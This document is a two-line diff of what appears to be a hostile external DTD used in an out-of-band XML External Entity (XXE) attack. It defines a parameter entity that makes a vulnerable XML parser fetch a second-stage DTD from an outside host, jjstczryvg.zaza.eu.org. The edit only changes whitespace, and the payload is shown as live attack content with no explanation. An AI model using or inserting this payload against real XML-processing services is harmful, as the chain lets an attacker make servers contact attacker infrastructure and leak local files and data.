@@ -1,2 +1,2 @@
 <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://jjstczryvg.zaza.eu.org/step2-dtd'>">
-  %eval;
+%eval;
